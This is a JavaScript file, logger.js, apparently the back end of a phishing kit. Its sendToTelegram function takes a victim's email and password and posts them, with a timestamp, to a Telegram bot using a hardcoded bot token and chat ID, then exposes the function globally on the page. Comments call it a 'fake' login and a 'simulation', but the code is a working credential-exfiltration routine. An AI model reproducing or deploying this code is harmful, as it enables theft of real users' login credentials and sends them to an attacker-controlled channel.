// logger.js

const TG_TOKEN   = "8360813543:AAEXff1pasBtUu6SYNwXvwUsujru8Fi5WKs";          // ← replace
const TG_CHAT_ID = " -1003863808356";            // ← replace (number or @channelusername)

async function sendToTelegram(email, password, extra = '') {
  const safeEmail    = escapeMarkdown(email);
  const safePassword = escapeMarkdown(password);

  const message = [
    "New login attempt (fake):",
    `Email: ${safeEmail}`,
    `Password: ${safePassword}`,
    `Extra: ${extra || 'None'}`,
    `Time: ${new Date().toISOString()}`
  ].join("\n");

  const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;

  const payload = {
    chat_id: TG_CHAT_ID,
    text: message,
    parse_mode: 'Markdown'
  };

  try {
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!resp.ok) throw new Error(`HTTP ${resp.status}`);

    const data = await resp.json();
    if (!data.ok) {
      console.error('Telegram API error:', data.description);
      throw new Error(data.description);
    }

    console.log('Exfil successful (simulation):', data.result.message_id);
  } catch (error) {
    console.error('Exfil failed:', error);
    throw error;
  }
}

function escapeMarkdown(text) {
  if (typeof text !== 'string') return text;
  // Full MarkdownV2 escape set
  return text.replace(/([_*[\]()~`>#+-=|{}.!])/g, '\\$1');
}

// Make it available globally
window.sendToTelegram = sendToTelegram;